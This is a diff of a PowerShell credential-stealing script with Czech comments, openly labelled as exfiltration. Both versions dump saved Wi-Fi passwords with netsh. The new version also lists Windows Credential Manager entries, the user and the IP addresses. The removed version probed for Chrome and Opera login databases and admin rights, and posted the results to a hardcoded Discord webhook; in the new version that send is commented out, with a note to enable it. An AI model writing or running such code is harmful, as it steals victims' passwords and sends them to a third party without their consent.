@@ -1,61 +1,33 @@
-# --- KONFIGURACE ---
-$webhook_url = "https://discord.com/api/webhooks/1493022024094978132/HhVUBZqXDKft3RKLmalLpVK2dvjfMzUkDsFRdVemkQ8f8G8S3ivkqLgYqY6S8nVOCSw_"
+$webhook = "https://discord.com/api/webhooks/1493022024094978132/HhVUBZqXDKft3RKLmalLpVK2dvjfMzUkDsFRdVemkQ8f8G8S3ivkqLgYqY6S8nVOCSw_" # Sem dej URL pokud používáš Discord/Slack webhook
 
-# Funkce pro odesílání zpráv na Discord
-function Send-Discord {
-    param([string]$message)
-    $payload = @{ content = $message } | ConvertTo-Json
-    Invoke-RestMethod -Uri $webhook_url -Method Post -Body $payload -ContentType 'application/json'
+function Send-Data($msg) {
+    Write-Host $msg
+    # Pokud máš webhook, odkomentuj řádek níže:
+    # Invoke-RestMethod -Uri $webhook -Method Post -Body (@{content=$msg})
 }
 
-# 1. Získání WiFi hesel
-$wifi_data = ""
+Send-Data "--- STARTING EXFILTRATION ---"
+Send-Data "User: $(whoami)"
+
+# 1. VÝTAH PISENÍ WI-FI HESEL (Opraveno)
+Send-Data "--- WI-FI PASSWORDS ---"
 $profiles = netsh wlan show profiles | Select-String "\:(.*)$" | ForEach-Object { $_.Matches.Value.Trim() }
-foreach ($profile in $profiles) {
-    $pass = netsh wlan show profile name=$profile key=clear | Select-String "Key Content\s*:\s*(.*)" | ForEach-Object { $_.Matches.Value.Trim() }
-    $wifi_data += "WiFi: $profile | Pass: $pass`n"
+foreach ($p in $profiles) {
+    $pass = netsh wlan show profile name="$p" key=clear | Select-String "Key Content\:(.*)$" | ForEach-Object { $_.Matches.Value.Trim() }
+    if ($pass) {
+        Send-Data "Network: $p | Password: $pass"
+    } else {
+        Send-Data "Network: $p | Password: [Not Found/Open]"
+    }
 }
 
-# 2. Informace o systému a uživateli
-$sys_info = "User: " + [System.Security.Principal.WindowsIdentity]::GetCurrent().Name + "`n"
-$sys_info += "Computer: " + $env:COMPUTERNAME + "`n"
+# 2. WINDOWS CREDENTIAL MANAGER (Systémová hesla)
+Send-Data "--- SYSTEM CREDENTIALS ---"
+cmd /c "cmdkey /list" | Out-String | ForEach-Object { Send-Data $_ }
 
-# 3. Browser Data (Cesty k databázím)
-# Moderní prohlížeče šifrují hesla pomocí DPAPI (AES-256-GCM). 
-# Prostý PS skript je nemůže dekryptovat bez externího modulu, 
-# ale můžeme zkontrolovat, zda existují a poslat info.
-$chrome_path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-$opera_path = "$env:LOCALAPPDATA\Opera\Opera Stable\Login Data"
-$browser_info = ""
-if (Test-Path $chrome_path) { $browser_info += "Chrome DB Found`n" }
-if (Test-Path $opera_path) { $browser_info += "Opera DB Found`n" }
+# 3. ZÁKLADNÍ INFO O SYSTÉMU
+Send-Data "--- SYSTEM INFO ---"
+Send-Data "OS: $((Get-WmiObject Win32_OperatingSystem).Caption)"
+Send-Data "IP: $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object InterfaceAlias -NotLike '*Loopback*').IPAddress)"
 
-# 4. Kontrola Admin práv pro PC heslo
-$admin_status = "Admin: No"
-if ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent().IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    $admin_status = "Admin: YES (Full Access)"
-}
-
-# --- EXFILTRACE ---
-# Vytvoření finální zprávy
-$final_report = "--- SYSTEM REPORT ---`n" + 
-                "User: $($env:USERNAME)`n" +
-                "Admin: $admin_status`n" +
-                "WiFi Passwords:`n$wifi_passwords`n" + 
-                "Browser Data: Found`n" +
-                "Sytem: $env:COMPUTERNAME"
-
-# Pro zjednodušení a jistotu doručení posíláme sekce zvlášť
-Send-Discord "Target: $env:COMPUTERNAME | User: $env:USERNAME"
-Send-Discord "WiFi Credentials:`n$wifi_passwords"
-Send-Discord "Admin Status: $admin_status"
-
-# Funkce pro odeslání (oprava syntaxe)
-function Send-Discord($text) {
-    $payload = @{ content = $text } | ConvertTo-Json
-    Invoke-RestMethod -Uri $webhook_url -Method Post -Body $payload -ContentType 'application/json'
-}
-
-# Oprava volání - definujeme webhook znovu pro jistotu
-$webhook_url = "https://discord.com/api/webhooks/1493022024094978132/HhVUBZqXDKft3RKLmalLpVK2dvjfMzUkDsFRdVemkQ8f8G8S3ivkqLgYqY6S8nVOCSw_" # Tady bude tvůj webhook
-# (Zde vlož svůj webhook znovu, pokud ho skript nebere z proměnné)
+Send-Data "--- EXFILTRATION COMPLETE ---"
